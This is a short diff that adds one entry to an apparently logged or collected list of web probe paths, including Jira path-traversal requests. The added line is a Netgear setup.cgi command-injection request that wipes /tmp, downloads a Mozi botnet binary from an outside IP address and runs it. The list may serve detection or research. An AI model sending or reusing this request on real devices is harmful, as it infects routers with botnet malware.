@@ -2791,3 +2791,4 @@ google.com:443
 /admin/assets/plugins/plupload/examples/upload.php
 /s/833323e23323e21323e2430313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
 /s/2343e2431323e27363e2237313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.197.115.239:50801/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
